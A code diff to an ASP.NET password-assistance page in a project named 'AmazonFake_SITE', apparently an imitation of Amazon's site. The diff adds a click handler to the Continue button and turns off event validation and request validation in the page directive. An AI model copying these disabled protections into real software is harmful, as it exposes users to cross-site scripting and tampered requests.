@@ -1,4 +1,4 @@
-﻿<%@ Page Title="" Language="C#" MasterPageFile="~/AmazonFake.Master" AutoEventWireup="true" CodeBehind="PasswordAssistance.aspx.cs" Inherits="AmazonFake_SITE.www.Access.PasswordAssistance" %>
+﻿<%@ Page Title="" Language="C#" MasterPageFile="~/AmazonFake.Master" enableEventValidation="false" validateRequest="false" AutoEventWireup="true" CodeBehind="PasswordAssistance.aspx.cs" Inherits="AmazonFake_SITE.www.Access.PasswordAssistance" %>
 <asp:Content ID="Content1" ContentPlaceHolderID="head" runat="server">
 </asp:Content>
 <asp:Content ID="Content2" ContentPlaceHolderID="ContentPlaceHolder1" runat="server">
@@ -22,7 +22,7 @@
 				</div>
 			</div>
 			<div >
-                <asp:Button class="BotonSingIn" ID="btn_Continue" runat="server" Text="Continue" />
+                <asp:Button class="BotonSingIn" ID="btn_Continue" runat="server" Text="Continue" OnClick="btn_Continue_Click" />
 			</div>
 		</form>
 		<div>
